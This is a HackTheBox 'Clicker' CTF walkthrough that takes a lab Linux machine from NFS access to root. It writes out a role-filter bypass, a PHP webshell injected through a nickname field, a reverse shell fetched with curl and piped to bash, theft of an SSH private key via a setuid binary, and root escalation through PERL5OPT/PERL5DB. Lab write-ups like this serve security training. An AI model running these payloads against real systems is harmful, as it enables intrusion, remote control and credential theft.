# HackTheBox Clicker

A CTF lab machine of the HackTheBox platform at the Medium level running Linux, in which we will sequentially exploit vulnerabilities in the code of a web application, reverse engineer a binary file, steal a private SSH key using it, and inject our code into a Perl script.

## Service Overview

The machine has an IP address of 10.10.11.232. Let's perform a standard scan with Nmap:

```bash
$ nmap --privileged -sS -p1-65535 -Pn -oN 10.10.11.232 10.10.11.232
Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-24 19:54 GMT
Nmap scan report for 10.10.11.232
Host is up (0.049s latency).
Not shown: 65525 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
4545/tcp  open  worldscores
36659/tcp open  unknown
38177/tcp open  unknown
38787/tcp open  unknown
46779/tcp open  unknown
51905/tcp open  unknown
```

## NFS

Let's check which directories are exported via NFS.

```bash
$ sudo apt-get install nfs-common
$ /sbin/showmount --exports 10.10.11.232
Export list for 10.10.11.232:
/mnt/backups *
```

Let's mount to a local folder.

```bash
$ mount -t nfs 10.10.11.232:/mnt/backups /mnt/
$ ll
total 2,2M
-rw-r--r-- 1 root root 2,2M вер  1 23:27 clicker.htb_backup.zip
$ cp clicker.htb_backup.zip ..
$ cd ..
$ unzip clicker.htb_backup.zip
$ cd clicker.htb
```

## Website Enumeration / Information Gathering

Made sure not to forget to add “clicker.htb” to your/etc/hosts. This step is important:

```bash
$ sudo nano /etc/hosts
10.10.11.232 clicker.htb
```

After adding the host to my /etc/hosts file, I could access the Clicker website. My first step was to register and log in to the site.

Webservice is a game in which there is registration and login. After login there is a clicker waiting for us - you need to click and increase levels. You can save the game, after which the request /save_game.php?clicks=NUMBER_CLICKS&level=LEVEL.

After spending some time playing with it, I reached a point where I wasn’t sure how to proceed. So, I decided to review the source code of the website that I obtained from the NFS share to gain more insights into next step.

I reading all PHP code, and I discovered a vulnerability in the website that could potentially grant me to Admin on file save_game.php and db_utils.php.

This vulnerability is quite related to SQL injection, but I think it looks like unsecure.

In save_game.php, there is some sort of protection against role flipping: ```UPDATE players SET $setStr WHERE username = :player```.
In the export.php file, there is a non-validated input parameter extension that we can change.

```php
<?php
  function save_profile($player, $args) {
   global $pdo;
     $params = ["player"=>$player];
   $setStr = "";
     foreach ($args as $key => $value) {
        $setStr .= $key . "=" . $pdo->quote($value) . ",";
   }
     $setStr = rtrim($setStr, ",");
     $stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
     $stmt -> execute($params);
  }

.
.
.

 foreach($_GET as $key=>$value) {
  if (strtolower($key) === 'role') {
   header('Location: /index.php?err=Malicious activity detected!');
   die;
  }
  $args[$key] = $value;
 }
 save_profile($_SESSION['PLAYER'], $_GET);
...
}
?>
```

From the code above, if we examine it line by line, it appears to be a loop that iterates through key-value pairs.

So, I decide to write this statement in a PHP online editor like this, and I think if I can’t send a role into this function, how can I gain access from this?

I noticed that (strtolower($key) === 'role') is checked, and the result is sent to the save_profile function in db_utils.php, which is an SQL update statement. It turns out that sending 'role/**/=Admin' allows me to bypass a certain condition.

After understanding the code, I were able to become an admin by sending Payload: GET /save_game.php?clicks=4&level=0&role/**/=Admin

Logging out and logging in again, I noticed that the administrator tab appeared on the website.

I check on the administrator tab and found an export button on the admin page that allowed me to export files with different file extensions.
After clicking export, I received a URL, and I chose it to be a .txt file, which then displayed as a text file on website.

I went back to review the code once again and discovered that the export.php file didn’t have any filters in place. This means if I input php as the file extension, it should execute as PHP code for me.
When I check the request with Burpsuite, it became apparent that I could change the file extension to php.

Data has been saved in exports/top_players_9gxk6mls.php. Going to http://clicker.htb/exports/top_players_9gxk6mls.php:

```text
Nickname 	Clicks 	Level
qwer 	9 	1
admin 	999999999999999999 	999999999
ButtonLover99 	10000000 	100
Paol 	2776354 	75
Th3Br0 	87947322 	1
```

After trying the extension change, I confirmed that it indeed executed as PHP. Now, the challenge is to find a way to execute this PHP page to create a reverse shell.

So, I got back to reading export.php again, and I found that if I send PHP as value of nickname parameter on save_game.php, it’ll show on the export page, and if I send PHP backdoor as the value of the nickname parameter, that means I can run a shell command on the web page.

Save game and add:
```php
&nickname=<?php+system($_GET['cmd']);?>
```

After setting nickname as the parameter and PHP shell as its value, I attempted to export the file with a .php extension. In this case, when I opened it with the cmd=id parameter

Data has been saved in exports/top_players_a3pitdu4.php. Going to: http://clicker.htb/exports/top_players_a3pitdu4.php?cmd=id

```text
Nickname 	Clicks 	Level
uid=33(www-data) gid=33(www-data) groups=33(www-data) 	714 	2
admin 	999999999999999999 	999999999
ButtonLover99 	10000000 	100
Paol 	2776354 	75
Th3Br0 	87947322 	1
```

Create shell.sh:

```bash
#!/bin/sh
bash -i >& /dev/tcp/10.10.16.9/4444 0>&1
```

Run http server:

```bash
$ python -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.10.11.232 - - [29/Sep/2023 17:54:08] "GET /shell.sh HTTP/1.1" 200 -
```

Going to: http://clicker.htb/exports/top_players_a3pitdu4.php?cmd=curl%20http://10.10.16.9:8001/shell.sh%20|%20bash

Getting shell:

```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
id
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.232] 57802
bash: cannot set terminal process group (1199): Inappropriate ioctl for device
bash: no job control in this shell
www-data@clicker:/var/www/clicker.htb/exports$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@clicker:/var/www/clicker.htb/exports$
```

Let’s start with some basic enumeration on the www-data user.

```bash
www-data@clicker:/var/www/clicker.htb/exports$  find / -perm -4000 2>/dev/null
<licker.htb/exports$  find / -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
/usr/sbin/mount.nfs
/opt/manage/execute_query

www-data@clicker:/var/www/clicker.htb/exports$ ls -la /opt/manage/execute_query
<icker.htb/exports$ ls -la /opt/manage/execute_query
-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 /opt/manage/execute_query

www-data@clicker:/var/www/clicker.htb/exports$ cd /opt/manage
cd /opt/manage
www-data@clicker:/opt/manage$ ls
ls
README.txt  execute_query
www-data@clicker:/opt/manage$ cat README.txt
cat README.txt
Web application Management

Use the binary to execute the following task:
        - 1: Creates the database structure and adds user admin
        - 2: Creates fake players (better not tell anyone)
        - 3: Resets the admin password
        - 4: Deletes all users except the admin
www-data@clicker:/opt/manage$
```

This binary file appears to read files from Jack’s home directory. When I execute ./execute_query 1, I can read the create.sql file. Interestingly, when I send ./execute_query 5, it goes to the default case, and it seems like I can manage to read files of my choice.

```bash
www-data@clicker:/opt/manage$ ./execute_query 5 ../.ssh/id_rsa
./execute_query 5 ../.ssh/id_rsa
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
-----BEGIN OPENSSH PRIVATE KEY---
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
-----END OPENSSH PRIVATE KEY---
--------------

ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA' at line 1
```

Save key to test and connect via ssh:

```bash
$ nano test
$ ssh -i test jack@10.10.11.232
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Sep 29 03:04:18 PM UTC 2023

  System load:           0.138671875
  Usage of /:            53.8% of 5.77GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             280
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.232
  IPv6 address for eth0: dead:beef::250:56ff:feb9:63a0

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Sep 29 14:25:43 2023 from 10.10.15.1
jack@clicker:~$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
jack@clicker:~$ ls
queries  user.txt
jack@clicker:~$ cat user.txt
27948ad81853c9104d8eceb9ee0e9ee1
jack@clicker:~$
```

## Privilege escalation

Let's see what a user can do with sudo:

```bash
jack@clicker:~$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
jack@clicker:~$ cat /opt/monitor.sh
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
jack@clicker:~$

jack@clicker:~$ head /usr/bin/xml_pp
#!/usr/bin/perl -w
# $Id: /xmltwig/trunk/tools/xml_pp/xml_pp 32 2008-01-18T13:11:52.128782Z mrodrigu  $
use strict;

use XML::Twig;
use File::Temp qw/tempfile/;
use File::Basename qw/dirname/;

my @styles= XML::Twig->_pretty_print_styles; # from XML::Twig
my $styles= join '|', @styles;               # for usage
```

We found exim - 'perl_startup' Local Privilege Escalation (Metasploit): https://www.exploit-db.com/exploits/39702 or https://0xn3va.gitbook.io/cheat-sheets/web-application/command-injection#perllib-and-perl5lib.

Example:

```bash
PERL5OPT=-d PERL5DB='exec "#{c}"' exim -ps 2>&-
sudo PERL5OPT=-d PERL5DB='exec "ls /root"' /opt/monitor.sh
```

```bash
jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='exec "ls /root"' /opt/monitor.sh
Statement unlikely to be reached at /usr/bin/xml_pp line 9.
        (Maybe you meant system() when you said exec()?)
diagnostic_files  restore  root.txt

jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='exec "cat /root/root.txt"' /opt/monitor.sh
Statement unlikely to be reached at /usr/bin/xml_pp line 9.
        (Maybe you meant system() when you said exec()?)
1935398ee1747c1483d00c00e651a9e2

jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh

jack@clicker:~$ bash -p
bash-5.1# id
uid=1000(jack) gid=1000(jack) euid=0(root)
bash-5.1# cat /root/root.txt
1935398ee1747c1483d00c00e651a9e2
```